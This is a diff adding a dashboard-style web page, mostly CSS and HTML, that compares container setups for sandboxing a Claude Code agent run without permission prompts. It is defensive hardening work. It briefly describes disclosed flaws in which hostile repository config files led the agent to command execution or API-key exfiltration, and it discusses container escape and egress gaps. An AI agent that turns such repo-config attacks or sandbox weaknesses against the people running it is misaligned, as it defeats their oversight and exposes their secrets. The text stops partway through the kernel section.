@@ -1,0 +1,1079 @@
+---
+layout: view
+view_name: "Dashboard"
+view_of: ../
+title: "Containers as the containment layer for `claude --dangerously-skip-permissions` — Dashboard"
+---
+
+<style>
+  .cc {
+    --bg: #080c0d;
+    --bg2: #0d1315;
+    --panel: #111a1c;
+    --panel2: #0b1214;
+    --line: #1d2c2f;
+    --line2: #2b4045;
+    --txt: #c6d6d4;
+    --dim: #74908f;
+    --dimmer: #4d6362;
+    --ok: #3ddc84;
+    --ok-d: #16412a;
+    --warn: #f2a33c;
+    --warn-d: #402d10;
+    --alarm: #ff4d4d;
+    --alarm-d: #451517;
+    --cyan: #55d9d0;
+    --mono: ui-monospace, "JetBrains Mono", "SFMono-Regular", "SF Mono", Menlo, Consolas, monospace;
+
+    margin: 0;
+    padding: 0 0 4rem;
+    background: var(--bg);
+    background-image:
+      radial-gradient(1100px 480px at 12% -8%, #11292b 0%, transparent 62%),
+      repeating-linear-gradient(0deg, rgba(255,255,255,.016) 0 1px, transparent 1px 3px);
+    color: var(--txt);
+    font-family: var(--mono);
+    font-size: 15px;
+    line-height: 1.5;
+    -webkit-font-smoothing: antialiased;
+  }
+  .cc *, .cc *::before, .cc *::after { box-sizing: border-box; }
+  .wrap { max-width: 1180px; margin: 0 auto; padding: 0 1.25rem; }
+
+  /* ---------- topbar ---------- */
+  .topbar {
+    border-bottom: 1px solid var(--line);
+    background: linear-gradient(180deg, #0e1719, #080c0d);
+  }
+  .topbar-in {
+    max-width: 1180px; margin: 0 auto; padding: .85rem 1.25rem;
+    display: flex; flex-wrap: wrap; align-items: baseline; gap: .5rem 1.1rem;
+  }
+  .brand {
+    font-size: .72rem; letter-spacing: .28em; text-transform: uppercase;
+    color: var(--cyan); font-weight: 700;
+  }
+  .brand b { color: var(--txt); font-weight: 700; }
+  .crumbs { font-size: .68rem; letter-spacing: .1em; text-transform: uppercase; color: var(--dimmer); }
+  .crumbs a { color: var(--dim); text-decoration: none; border-bottom: 1px dotted var(--line2); }
+  .crumbs a:hover { color: var(--cyan); }
+  .topbar-meta { margin-left: auto; display: flex; gap: .4rem; flex-wrap: wrap; }
+  .chip {
+    font-size: .62rem; letter-spacing: .14em; text-transform: uppercase;
+    padding: .2rem .45rem; border: 1px solid var(--line2); color: var(--dim);
+    background: var(--panel2); border-radius: 2px; white-space: nowrap;
+  }
+
+  /* ---------- masthead ---------- */
+  .mast { padding: 2.6rem 0 1.6rem; }
+  .kicker {
+    font-size: .66rem; letter-spacing: .3em; text-transform: uppercase; color: var(--warn);
+    margin-bottom: 1rem;
+  }
+  .mast h1 {
+    margin: 0 0 .9rem; font-family: var(--mono); font-weight: 700;
+    font-size: clamp(1.55rem, 4.4vw, 2.8rem); line-height: 1.08; letter-spacing: -.02em;
+    color: #eaf5f3;
+  }
+  .mast h1 code {
+    font: inherit; color: var(--cyan); background: none; padding: 0;
+  }
+  .mast p.lede { margin: 0; max-width: 62ch; color: var(--dim); font-size: .95rem; }
+
+  /* ---------- verdict ---------- */
+  .verdict {
+    border: 1px solid var(--line2); border-left: 4px solid var(--ok);
+    background:
+      linear-gradient(180deg, #0f1e1a, var(--panel));
+    padding: 1.4rem 1.4rem 1.15rem;
+  }
+  .verdict-hd {
+    display: flex; align-items: center; gap: .6rem; flex-wrap: wrap;
+    font-size: .66rem; letter-spacing: .26em; text-transform: uppercase; color: var(--dim);
+    margin-bottom: .8rem;
+  }
+  .verdict h2 {
+    margin: 0 0 .55rem; font-size: clamp(1.15rem, 3.1vw, 1.85rem); line-height: 1.2;
+    color: #e8fff4; letter-spacing: -.01em;
+  }
+  .verdict .neg { color: var(--alarm); }
+  .verdict p { margin: .55rem 0 0; color: var(--dim); font-size: .88rem; max-width: 74ch; }
+  .interlocks { display: flex; flex-wrap: wrap; gap: .45rem; margin-top: 1rem; }
+
+  /* ---------- lamps ---------- */
+  .lamp {
+    display: inline-flex; align-items: center; gap: .38rem;
+    font-size: .63rem; letter-spacing: .13em; text-transform: uppercase;
+    padding: .26rem .55rem; border-radius: 2px; border: 1px solid var(--line2);
+    background: var(--panel2); color: var(--dim); white-space: nowrap;
+  }
+  .lamp::before {
+    content: ""; width: 7px; height: 7px; border-radius: 50%;
+    background: var(--dimmer); box-shadow: none; flex: 0 0 auto;
+  }
+  .lamp.ok    { color: #b7f2cf; border-color: #22503a; background: var(--ok-d); }
+  .lamp.ok::before    { background: var(--ok);    box-shadow: 0 0 7px var(--ok); }
+  .lamp.warn  { color: #ffdca8; border-color: #5a4118; background: var(--warn-d); }
+  .lamp.warn::before  { background: var(--warn);  box-shadow: 0 0 7px var(--warn); }
+  .lamp.alarm { color: #ffc4c4; border-color: #5e2124; background: var(--alarm-d); }
+  .lamp.alarm::before { background: var(--alarm); box-shadow: 0 0 7px var(--alarm); }
+
+  /* ---------- section scaffolding ---------- */
+  section { margin-top: 2.6rem; }
+  .sec-hd {
+    display: flex; align-items: baseline; gap: .8rem; flex-wrap: wrap;
+    border-bottom: 1px solid var(--line); padding-bottom: .5rem; margin-bottom: 1.2rem;
+  }
+  .sec-hd h3 {
+    margin: 0; font-size: .78rem; letter-spacing: .24em; text-transform: uppercase; color: #d8ebe8;
+  }
+  .sec-hd .num { font-size: .68rem; color: var(--cyan); letter-spacing: .12em; }
+  .sec-hd .note { margin-left: auto; font-size: .68rem; color: var(--dimmer); letter-spacing: .06em; }
+
+  .panel {
+    border: 1px solid var(--line); background: var(--panel);
+  }
+  .panel-hd {
+    display: flex; align-items: center; gap: .6rem; flex-wrap: wrap;
+    padding: .55rem .85rem; border-bottom: 1px solid var(--line);
+    background: var(--panel2);
+    font-size: .63rem; letter-spacing: .2em; text-transform: uppercase; color: var(--dim);
+  }
+  .panel-bd { padding: 1rem .95rem; }
+
+  /* ---------- rack ---------- */
+  .rack { display: grid; gap: .7rem; }
+  .ru {
+    display: grid; grid-template-columns: 132px 1fr 250px; gap: 1rem;
+    border: 1px solid var(--line); background: var(--panel);
+    padding: .85rem .9rem; align-items: start;
+    position: relative;
+  }
+  .ru.sel { border-color: #2c6b4b; background: linear-gradient(90deg, #0e1f18 0%, var(--panel) 45%); }
+  .ru.bad { border-color: #4d2224; }
+  .ru.neutral { border-color: var(--line); opacity: .92; }
+  .ru-mark {
+    border: 1px solid var(--line2); background: #e9f0ef; border-radius: 2px;
+    height: 62px; display: flex; align-items: center; justify-content: center;
+    overflow: hidden; padding: .3rem;
+  }
+  .ru-mark.flush { padding: 0; }
+  .ru-mark img { max-width: 100%; max-height: 100%; object-fit: contain; display: block; }
+  .ru-mark.flush img { width: 100%; height: 100%; object-fit: cover; }
+  .ru-name { font-size: .95rem; color: #e6f4f1; font-weight: 700; letter-spacing: -.01em; }
+  .ru-name a { color: inherit; text-decoration: none; border-bottom: 1px solid var(--line2); }
+  .ru-name a:hover { color: var(--cyan); border-color: var(--cyan); }
+  .ru-sub { font-size: .7rem; color: var(--dimmer); letter-spacing: .08em; text-transform: uppercase; margin-top: .2rem; }
+  .ru-escape { margin-top: .6rem; font-size: .8rem; color: var(--dim); }
+  .ru-escape b { color: var(--alarm); font-weight: 700; }
+  .ru-escape b.soft { color: var(--warn); }
+  .ru-escape b.good { color: var(--ok); }
+  .ru-lamps { display: flex; flex-wrap: wrap; gap: .35rem; margin-top: .6rem; }
+  .ru-gauges { display: grid; gap: .4rem; }
+
+  .gauge { display: grid; grid-template-columns: 78px 1fr 30px; gap: .5rem; align-items: center; }
+  .gauge-lbl { font-size: .58rem; letter-spacing: .12em; text-transform: uppercase; color: var(--dimmer); }
+  .gauge-val { font-size: .62rem; color: var(--dim); text-align: right; font-variant-numeric: tabular-nums; }
+  .segs { display: flex; gap: 3px; }
+  .segs i { display: block; height: 11px; flex: 1 1 0; background: #172124; border: 1px solid #1b2a2d; border-radius: 1px; }
+  .segs.g i.on { background: var(--ok); border-color: var(--ok); box-shadow: 0 0 5px rgba(61,220,132,.45); }
+  .segs.a i.on { background: var(--warn); border-color: var(--warn); box-shadow: 0 0 5px rgba(242,163,60,.4); }
+  .segs.r i.on { background: var(--alarm); border-color: var(--alarm); box-shadow: 0 0 5px rgba(255,77,77,.4); }
+  .segs.dash i { background: repeating-linear-gradient(90deg, #223235 0 3px, transparent 3px 6px); }
+
+  /* ---------- kernel band ---------- */
+  .kernel-band {
+    display: grid; grid-template-columns: 58px 1fr; gap: 1rem; align-items: center;
+    border: 1px solid var(--line); border-left: 3px solid var(--cyan);
+    background: var(--panel2); padding: .8rem .9rem; margin-bottom: .8rem;
+  }
+  .kernel-band img { width: 100%; height: auto; display: block; }
+  .kernel-band p { margin: 0; font-size: .85rem; color: var(--dim); max-width: 78ch; }
+
+  /* ---------- instrument row ---------- */
+  .instruments { display: grid; grid-template-columns: repeat(auto-fit, minmax(min(210px, 100%), 1fr)); gap: .7rem; }
+  .inst { border: 1px solid var(--line); background: var(--panel); padding: .9rem .85rem; }
+  .inst .big {
+    font-size: clamp(1.9rem, 5vw, 2.7rem); line-height: 1; font-weight: 700;
+    color: var(--cyan); font-variant-numeric: tabular-nums; letter-spacing: -.03em;
+  }
+  .inst.amber .big { color: var(--warn); }
+  .inst.red .big { color: var(--alarm); }
+  .inst .unit { font-size: .8rem; color: var(--dimmer); }
+  .inst .lbl { font-size: .6rem; letter-spacing: .18em; text-transform: uppercase; color: var(--dim); margin-top: .5rem; }
+  .inst .txt { font-size: .76rem; color: var(--dimmer); margin-top: .4rem; line-height: 1.45; }
+
+  /* ---------- alarms ---------- */
+  .alarm-grid { display: grid; gap: .55rem; }
+  .alm {
+    display: grid; grid-template-columns: 190px 1fr; gap: .9rem;
+    border: 1px solid #4d2224; border-left: 4px solid var(--alarm);
+    background: linear-gradient(90deg, #1a0e10, var(--panel) 60%);
+    padding: .8rem .9rem;
+  }
+  .alm.med { border-color: #5a4118; border-left-color: var(--warn); background: linear-gradient(90deg, #1a1408, var(--panel) 60%); }
+  .alm-code { font-size: .68rem; letter-spacing: .12em; color: #ffb0b0; font-weight: 700; }
+  .alm.med .alm-code { color: #ffd79a; }
+  .alm-sev { font-size: .56rem; letter-spacing: .18em; text-transform: uppercase; color: var(--dimmer); margin-top: .25rem; }
+  .alm-body { font-size: .85rem; color: var(--txt); }
+  .alm-body p { margin: 0 0 .45rem; }
+  .alm-body p:last-child { margin-bottom: 0; }
+  .pass-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(min(230px, 100%), 1fr)); gap: .5rem; }
+  .pass {
+    border: 1px solid #22503a; border-left: 3px solid var(--ok); background: #0c1713;
+    padding: .6rem .7rem; font-size: .78rem; color: var(--dim);
+  }
+  .pass b { color: #b7f2cf; display: block; font-size: .62rem; letter-spacing: .14em; text-transform: uppercase; margin-bottom: .25rem; }
+
+  /* ---------- routing lanes ---------- */
+  .lane {
+    border: 1px solid var(--line); background: var(--panel);
+    padding: .9rem; display: grid; grid-template-columns: 44px 1fr; gap: .9rem;
+    margin-bottom: .6rem;
+  }
+  .lane.best { border-color: #2c6b4b; }
+  .lane.worst { border-color: #4d2224; }
+  .lane-rank {
+    font-size: 1.5rem; font-weight: 700; color: var(--dimmer); text-align: center; line-height: 1;
+    border-right: 1px solid var(--line); padding-right: .5rem;
+  }
+  .lane.best .lane-rank { color: var(--ok); }
+  .lane.worst .lane-rank { color: var(--alarm); }
+  .lane-title { font-size: .88rem; color: #e6f4f1; font-weight: 700; margin-bottom: .5rem; }
+  .flow { display: flex; align-items: center; flex-wrap: wrap; gap: .35rem; margin: .55rem 0; }
+  .node {
+    border: 1px solid var(--line2); background: #0a1112; padding: .3rem .55rem; border-radius: 2px;
+    font-size: .66rem; letter-spacing: .08em; text-transform: uppercase; color: var(--dim); white-space: nowrap;
+  }
+  .node.agent { border-color: var(--cyan); color: #b6f0ec; }
+  .node.gate  { border-color: var(--ok); color: #b7f2cf; background: var(--ok-d); }
+  .node.net   { border-color: var(--dimmer); }
+  .node.leak  { border-color: var(--alarm); color: #ffc4c4; background: var(--alarm-d); border-style: dashed; }
+  .arrow { color: var(--dimmer); font-size: .85rem; }
+  .arrow.bad { color: var(--alarm); }
+  .lane-note { font-size: .8rem; color: var(--dim); margin: .35rem 0 0; }
+
+  /* ---------- tables ---------- */
+  .tscroll { overflow-x: auto; }
+  table.rules { width: 100%; border-collapse: collapse; font-size: .8rem; min-width: 520px; }
+  table.rules th {
+    text-align: left; font-size: .58rem; letter-spacing: .16em; text-transform: uppercase;
+    color: var(--dim); padding: .5rem .6rem; border-bottom: 1px solid var(--line2); font-weight: 400;
+    background: var(--panel2);
+  }
+  table.rules td { padding: .5rem .6rem; border-bottom: 1px solid #162124; color: var(--txt); vertical-align: top; }
+  table.rules tr:last-child td { border-bottom: 0; }
+  table.rules td.host { color: var(--cyan); }
+  table.rules td.drop { color: var(--dimmer); }
+  table.rules tr.deny td { color: var(--dimmer); }
+  table.rules tr.deny td.host { color: #ff9a9a; text-decoration: line-through; text-decoration-color: #5e2124; }
+
+  /* ---------- code ---------- */
+  .term { border: 1px solid var(--line); background: #060a0b; }
+  .term-hd {
+    display: flex; align-items: center; gap: .45rem; padding: .45rem .7rem;
+    border-bottom: 1px solid var(--line); background: var(--panel2);
+    font-size: .6rem; letter-spacing: .16em; text-transform: uppercase; color: var(--dim);
+  }
+  .term-hd .dot { width: 8px; height: 8px; border-radius: 50%; background: #23383a; flex: 0 0 auto; }
+  .term pre {
+    margin: 0; padding: .85rem .9rem; overflow-x: auto; font-family: var(--mono);
+    font-size: .76rem; line-height: 1.65; color: #b9cfcc; background: none;
+  }
+  .term pre .c { color: #4f6b69; }
+  .term pre .k { color: var(--cyan); }
+  .term pre .s { color: #d9c07a; }
+  .term pre .bad { color: #ff9a9a; }
+  .term pre .good { color: #8ee5ab; }
+
+  /* ---------- log ---------- */
+  .log { border: 1px solid var(--line); background: #060a0b; }
+  .log-row {
+    display: grid; grid-template-columns: 108px 1fr; gap: .8rem;
+    padding: .6rem .8rem; border-bottom: 1px solid #101a1c; font-size: .81rem;
+  }
+  .log-row:last-child { border-bottom: 0; }
+  .log-tag { font-size: .6rem; letter-spacing: .14em; text-transform: uppercase; color: var(--warn); padding-top: .15rem; }
+  .log-tag.dim { color: var(--dimmer); }
+  .log-txt { color: var(--dim); }
+  .log-txt b { color: var(--txt); font-weight: 700; }
+
+  /* ---------- impl cards ---------- */
+  .impl { display: grid; grid-template-columns: repeat(auto-fit, minmax(min(275px, 100%), 1fr)); gap: .7rem; }
+  .impl-card { border: 1px solid var(--line); background: var(--panel); display: flex; flex-direction: column; }
+  .impl-card img { width: 100%; aspect-ratio: 2 / 1; object-fit: cover; display: block; border-bottom: 1px solid var(--line); filter: saturate(.75) contrast(1.05); }
+  .impl-bd { padding: .8rem .85rem; }
+  .impl-name { font-size: .9rem; font-weight: 700; color: #e6f4f1; }
+  .impl-name a { color: inherit; text-decoration: none; border-bottom: 1px solid var(--line2); }
+  .impl-name a:hover { color: var(--cyan); border-color: var(--cyan); }
+  .impl-stars { font-size: .68rem; color: var(--warn); margin-left: .35rem; white-space: nowrap; }
+  .impl-txt { font-size: .79rem; color: var(--dim); margin: .5rem 0 0; line-height: 1.5; }
+  .impl-steal { font-size: .68rem; color: #b7f2cf; margin-top: .6rem; padding-top: .5rem; border-top: 1px dashed var(--line2); }
+
+  /* ---------- interlock (socket) ---------- */
+  .interlock {
+    border: 2px solid var(--alarm); background: repeating-linear-gradient(45deg, #1a0e10 0 12px, #140a0c 12px 24px);
+    padding: 1.3rem 1.2rem;
+  }
+  .interlock .hd {
+    font-size: clamp(1.05rem, 3vw, 1.5rem); font-weight: 700; color: #ffb0b0; letter-spacing: .04em;
+    display: flex; align-items: center; gap: .6rem; flex-wrap: wrap;
+  }
+  .interlock .hd .sign { font-size: 1.5rem; }
+  .interlock p { margin: .7rem 0 0; font-size: .85rem; color: #dcc8c8; max-width: 76ch; }
+  .interlock code { color: #ffd0d0; }
+
+  /* ---------- escalate ---------- */
+  .escalate { display: grid; grid-template-columns: 108px 1fr; gap: 1.1rem; align-items: center; }
+  .escalate .mark {
+    border: 1px solid var(--line2); background: #e9f0ef; padding: .7rem;
+    display: flex; align-items: center; justify-content: center; aspect-ratio: 1;
+  }
+  .escalate .mark img { max-width: 100%; max-height: 100%; height: auto; display: block; }
+
+  /* ---------- sources ---------- */
+  .src-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(min(300px, 100%), 1fr)); gap: .4rem; }
+  .src {
+    display: grid; grid-template-columns: 20px 1fr; gap: .55rem; align-items: start;
+    padding: .45rem .5rem; border: 1px solid transparent; border-radius: 2px;
+  }
+  .src:hover { border-color: var(--line2); background: var(--panel2); }
+  .src img { width: 16px; height: 16px; margin-top: .2rem; border-radius: 2px; }
+  .src a { color: var(--txt); text-decoration: none; font-size: .78rem; border-bottom: 1px solid transparent; }
+  .src a:hover { color: var(--cyan); border-color: var(--cyan); }
+  .src .meta { font-size: .58rem; letter-spacing: .12em; text-transform: uppercase; color: var(--dimmer); margin-top: .15rem; }
+  .src .n { color: var(--dimmer); font-size: .7rem; }
+
+  /* ---------- siblings ---------- */
+  .sibs { display: grid; grid-template-columns: repeat(auto-fit, minmax(min(280px, 100%), 1fr)); gap: .55rem; }
+  .sib {
+    border: 1px solid var(--line); background: var(--panel); padding: .75rem .8rem;
+    text-decoration: none; display: block;
+  }
+  .sib:hover { border-color: var(--cyan); background: var(--panel2); }
+  .sib .d { font-size: .56rem; letter-spacing: .18em; text-transform: uppercase; color: var(--warn); }
+  .sib .t { font-size: .82rem; color: #e6f4f1; margin: .3rem 0 .35rem; line-height: 1.35; }
+  .sib .s { font-size: .72rem; color: var(--dimmer); line-height: 1.5; }
+
+  .footnote { margin-top: 2.4rem; padding-top: .9rem; border-top: 1px solid var(--line); font-size: .7rem; color: var(--dimmer); letter-spacing: .06em; }
+  .footnote a { color: var(--dim); }
+
+  sup a { color: var(--cyan); text-decoration: none; font-size: .68em; }
+  sup a:hover { text-decoration: underline; }
+  .cc a.inline { color: var(--cyan); text-decoration: none; border-bottom: 1px solid #21454a; }
+  .cc a.inline:hover { border-color: var(--cyan); }
+  .cc code { font-family: var(--mono); font-size: .88em; background: #0a1214; border: 1px solid var(--line); padding: .04em .3em; border-radius: 2px; color: #cfe3e0; }
+
+  @media (max-width: 860px) {
+    .ru { grid-template-columns: 84px 1fr; }
+    .ru-gauges { grid-column: 1 / -1; }
+    .alm { grid-template-columns: 1fr; gap: .5rem; }
+    .escalate { grid-template-columns: 1fr; }
+    .escalate .mark { max-width: 108px; }
+  }
+  @media (max-width: 560px) {
+    .cc { font-size: 14px; }
+    .wrap { padding: 0 .85rem; }
+    .ru { grid-template-columns: 1fr; }
+    .ru-mark { max-width: 132px; }
+    .log-row { grid-template-columns: 1fr; gap: .25rem; }
+    .lane { grid-template-columns: 1fr; }
+    .lane-rank { border-right: 0; border-bottom: 1px solid var(--line); padding: 0 0 .4rem; text-align: left; }
+    .gauge { grid-template-columns: 64px 1fr 26px; }
+  }
+</style>
+
+<div class="cc">
+
+  <div class="topbar">
+    <div class="topbar-in">
+      <span class="brand">CONTAINMENT <b>CONSOLE</b></span>
+      <span class="crumbs">
+        <a href="../../">Linux workstation safety</a> / <a href="../">containers</a>
+      </span>
+      <span class="topbar-meta">
+        <span class="chip">depth · survey</span>
+        <span class="chip">34 sources</span>
+        <span class="chip">12 min read</span>
+        <span class="chip">2026-07-30</span>
+      </span>
+    </div>
+  </div>
+
+  <div class="wrap">
+
+    <header class="mast">
+      <div class="kicker">Containment layer for <code>claude --dangerously-skip-permissions</code></div>
+      <h1>Five ways to put the agent in a box.<br>Only one of them holds the network.</h1>
+      <p class="lede">Rootless Podman vs rootless Docker vs Docker on the default daemon vs the Dev Containers spec vs Anthropic's reference devcontainer — scored on isolation strength, egress control and daily friction, with the reference firewall's four defects on the alarm panel.</p>
+    </header>
+
+    <div class="verdict">
+      <div class="verdict-hd">
+        <span class="lamp ok">System armed</span>
+        <span>Recommended configuration</span>
+      </div>
+      <h2>Rootless Podman · <code>--userns=keep-id</code> · repo-only bind mount · egress through a proxy sidecar on an <code>--internal</code> network — <span class="neg">not</span> <code>NET_ADMIN</code> + <code>iptables</code>.</h2>
+      <p>Anthropic's reference devcontainer is a good <em>shape</em> but a weak <em>boundary</em>: it allows unrestricted outbound DNS <sup><a href="https://github.com/anthropics/claude-code/issues/36907">[4]</a></sup>, allowlists all of GitHub's CIDR space, and grants the agent's own container <code>CAP_NET_ADMIN</code> <sup><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/devcontainer.json">[14]</a></sup>. If the repo is genuinely untrusted, skip containers and use a Proxmox VM — Anthropic says the same <sup><a href="https://code.claude.com/docs/en/sandbox-environments">[1]</a></sup>.</p>
+      <div class="interlocks">
+        <span class="lamp ok">userns keep-id</span>
+        <span class="lamp ok">repo is the only mount</span>
+        <span class="lamp ok">cap_drop ALL</span>
+        <span class="lamp ok">no route off the box</span>
+        <span class="lamp ok">secrets live in the proxy</span>
+        <span class="lamp warn">workspace stays writable</span>
+        <span class="lamp alarm">docker.sock — never</span>
+      </div>
+      <p>Containment matters even if you trust the model: three disclosed Claude Code flaws achieved command execution or API-key exfiltration purely from repository-local config files — <code>.claude/settings.json</code>, <code>.mcp.json</code>, <code>ANTHROPIC_BASE_URL</code> — because "configuration files effectively become part of the execution layer" <sup><a href="https://thehackernews.com/2026/02/claude-code-flaws-allow-remote-code.html">[29]</a></sup>. A container turns <em>cloned a hostile repo</em> from a host compromise into a workspace compromise.</p>
+    </div>
+
+    <!-- ============ RACK ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">01</span>
+        <h3>Engine rack</h3>
+        <span class="note">green = capability · amber = cost you pay</span>
+      </div>
+
+      <div class="rack">
+
+        <!-- Podman -->
+        <div class="ru sel">
+          <div class="ru-mark">
+            <img src="dashboard/images/podman.webp" alt="Podman logo">
+          </div>
+          <div>
+            <div class="ru-name"><a href="https://docs.podman.io/en/latest/markdown/podman-network-create.1.html">Rootless Podman</a> <span class="impl-stars">⭐ 32k</span></div>
+            <div class="ru-sub">Daemonless · selected</div>
+            <div class="ru-escape">Escape yields <b class="good">your host user only</b> <sup><a href="https://blog.nviso.eu/2026/02/03/rootless-containers-with-podman/">[12]</a></sup> — no long-running privileged daemon to inherit.</div>
+            <div class="ru-lamps">
+              <span class="lamp ok">UID sane · keep-id</span>
+              <span class="lamp ok">SELinux container_t</span>
+              <span class="lamp ok">--internal + proxy</span>
+            </div>
+          </div>
+          <div class="ru-gauges">
+            <div class="gauge"><span class="gauge-lbl">Isolation</span><span class="segs g"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i><i></i></span><span class="gauge-val">4/5</span></div>
+            <div class="gauge"><span class="gauge-lbl">Egress ctl</span><span class="segs g"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i></span><span class="gauge-val">5/5</span></div>
+            <div class="gauge"><span class="gauge-lbl">Friction</span><span class="segs a"><i class="on"></i><i class="on"></i><i class="on"></i><i></i><i></i></span><span class="gauge-val">3/5</span></div>
+          </div>
+        </div>
+
+        <!-- Docker default -->
+        <div class="ru bad">
+          <div class="ru-mark">
+            <img src="dashboard/images/docker.webp" alt="Docker logo">
+          </div>
+          <div>
+            <div class="ru-name"><a href="https://docs.docker.com/engine/security/seccomp/">Docker · default daemon</a></div>
+            <div class="ru-sub">Rootful · lowest friction</div>
+            <div class="ru-escape">Escape yields <b>host root</b> — the daemon runs as root, so a break-out inherits it.</div>
+            <div class="ru-lamps">
+              <span class="lamp ok">UIDs are real</span>
+              <span class="lamp ok">AppArmor docker-default</span>
+              <span class="lamp ok">proxy or NET_ADMIN both work</span>
+            </div>
+          </div>
+          <div class="ru-gauges">
+            <div class="gauge"><span class="gauge-lbl">Isolation</span><span class="segs r"><i class="on"></i><i></i><i></i><i></i><i></i></span><span class="gauge-val">1/5</span></div>
+            <div class="gauge"><span class="gauge-lbl">Egress ctl</span><span class="segs g"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i></span><span class="gauge-val">5/5</span></div>
+            <div class="gauge"><span class="gauge-lbl">Friction</span><span class="segs a"><i class="on"></i><i></i><i></i><i></i><i></i></span><span class="gauge-val">1/5</span></div>
+          </div>
+        </div>
+
+        <!-- Rootless Docker -->
+        <div class="ru bad">
+          <div class="ru-mark" style="filter:grayscale(1) opacity(.72);">
+            <img src="dashboard/images/docker.webp" alt="Docker logo, desaturated">
+          </div>
+          <div>
+            <div class="ru-name"><a href="https://docs.docker.com/engine/security/rootless/">Rootless Docker</a></div>
+            <div class="ru-sub">Fault · dead end for this workload</div>
+            <div class="ru-escape">Escape yields <b class="soft">your host user only</b> <sup><a href="https://docs.docker.com/engine/security/rootless/">[7]</a></sup>, but bind-mounted repo files appear <b>root-owned</b> inside the container <sup><a href="https://github.com/moby/moby/issues/45919">[18]</a></sup> — and the CLI refuses <code>--dangerously-skip-permissions</code> as root <sup><a href="https://code.claude.com/docs/en/devcontainer">[2]</a></sup>.</div>
+            <div class="ru-lamps">
+              <span class="lamp alarm">UID trap · worst of five</span>
+              <span class="lamp alarm">AppArmor unsupported</span>
+              <span class="lamp warn">in-container iptables fragile</span>
+            </div>
+          </div>
+          <div class="ru-gauges">
+            <div class="gauge"><span class="gauge-lbl">Isolation</span><span class="segs g"><i class="on"></i><i class="on"></i><i class="on"></i><i></i><i></i></span><span class="gauge-val">3/5</span></div>
+            <div class="gauge"><span class="gauge-lbl">Egress ctl</span><span class="segs r"><i class="on"></i><i class="on"></i><i></i><i></i><i></i></span><span class="gauge-val">2/5</span></div>
+            <div class="gauge"><span class="gauge-lbl">Friction</span><span class="segs a"><i class="on"></i><i class="on"></i><i class="on"></i><i></i><i></i></span><span class="gauge-val">3/5</span></div>
+          </div>
+        </div>
+
+        <!-- Dev Containers spec -->
+        <div class="ru neutral">
+          <div class="ru-mark flush">
+            <img src="dashboard/images/devcontainers-cli.webp" alt="devcontainers/cli repository card">
+          </div>
+          <div>
+            <div class="ru-name"><a href="https://containers.dev/">Dev Containers (spec)</a></div>
+            <div class="ru-sub">Pass-through · packaging, not isolation</div>
+            <div class="ru-escape"><code>devcontainer.json</code> is a portable <em>description</em> of an environment <sup><a href="https://containers.dev/">[31]</a></sup> that the <a class="inline" href="https://github.com/devcontainers/cli">devcontainer CLI</a> ⭐ 2.9k <sup><a href="https://github.com/devcontainers/cli">[32]</a></sup> or your editor materialises on Docker or Podman. Security properties come from the engine underneath and the <code>runArgs</code> you put in it.</div>
+            <div class="ru-lamps">
+              <span class="lamp">inherits engine</span>
+              <span class="lamp">inherits engine</span>
+              <span class="lamp alarm">IDE channel is outside the firewall</span>
+            </div>
+          </div>
+          <div class="ru-gauges">
+            <div class="gauge"><span class="gauge-lbl">Isolation</span><span class="segs dash"><i></i><i></i><i></i><i></i><i></i></span><span class="gauge-val">—</span></div>
+            <div class="gauge"><span class="gauge-lbl">Egress ctl</span><span class="segs dash"><i></i><i></i><i></i><i></i><i></i></span><span class="gauge-val">—</span></div>
+            <div class="gauge"><span class="gauge-lbl">Friction</span><span class="segs a"><i class="on"></i><i></i><i></i><i></i><i></i></span><span class="gauge-val">1/5</span></div>
+          </div>
+        </div>
+
+        <!-- Reference devcontainer -->
+        <div class="ru bad">
+          <div class="ru-mark flush">
+            <img src="dashboard/images/claude-code-repo.webp" alt="anthropics/claude-code repository card">
+          </div>
+          <div>
+            <div class="ru-name"><a href="https://code.claude.com/docs/en/devcontainer">Anthropic reference devcontainer</a></div>
+            <div class="ru-sub">4 alarms active · see panel 03</div>
+            <div class="ru-escape">Assumes rootful Docker, so escape yields <b>host root</b>. Anthropic calls it "a working example rather than a maintained base image" <sup><a href="https://code.claude.com/docs/en/devcontainer">[2]</a></sup>.</div>
+            <div class="ru-lamps">
+              <span class="lamp ok">workspace-only mount</span>
+              <span class="lamp alarm">DNS wide open</span>
+              <span class="lamp alarm">all of GitHub allowlisted</span>
+              <span class="lamp alarm">NET_ADMIN in the agent</span>
+            </div>
+          </div>
+          <div class="ru-gauges">
+            <div class="gauge"><span class="gauge-lbl">Isolation</span><span class="segs r"><i class="on"></i><i></i><i></i><i></i><i></i></span><span class="gauge-val">1/5</span></div>
+            <div class="gauge"><span class="gauge-lbl">Egress ctl</span><span class="segs r"><i class="on"></i><i class="on"></i><i></i><i></i><i></i></span><span class="gauge-val">2/5</span></div>
+            <div class="gauge"><span class="gauge-lbl">Friction</span><span class="segs a"><i class="on"></i><i></i><i></i><i></i><i></i></span><span class="gauge-val">1/5</span></div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ============ KERNEL INSTRUMENTS ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">02</span>
+        <h3>What an escape actually needs</h3>
+        <span class="note">kernel-level readout — decides how much rootless buys you</span>
+      </div>
+
+      <div class="kernel-band">
+        <img src="dashboard/images/tux.webp" alt="Tux, the Linux kernel mascot">
+        <p>All five options in the rack share one kernel — yours. Every difference between them is a difference in which of these three kernel facilities is switched on, and who is allowed to switch it back off.</p>
+      </div>
+
+      <div class="instruments">
+        <div class="inst">
+          <div class="big">44<span class="unit">/300+</span></div>
+          <div class="lbl">Syscalls blocked · default seccomp</div>
+          <div class="txt">Includes <code>mount</code>, <code>unshare</code>, <code>keyctl</code>, <code>bpf</code>, <code>ptrace</code> and the module-loading calls <sup><a href="https://docs.docker.com/engine/security/seccomp/">[10]</a></sup>. This is why CVE-2022-0185 — which needed <code>unshare</code> — was not exploitable from a stock container <sup><a href="https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-6/">[11]</a></sup>. Keeping the default profile is worth more than most hand-written hardening.</div>
+        </div>
+        <div class="inst">
+          <div class="big">65536</div>
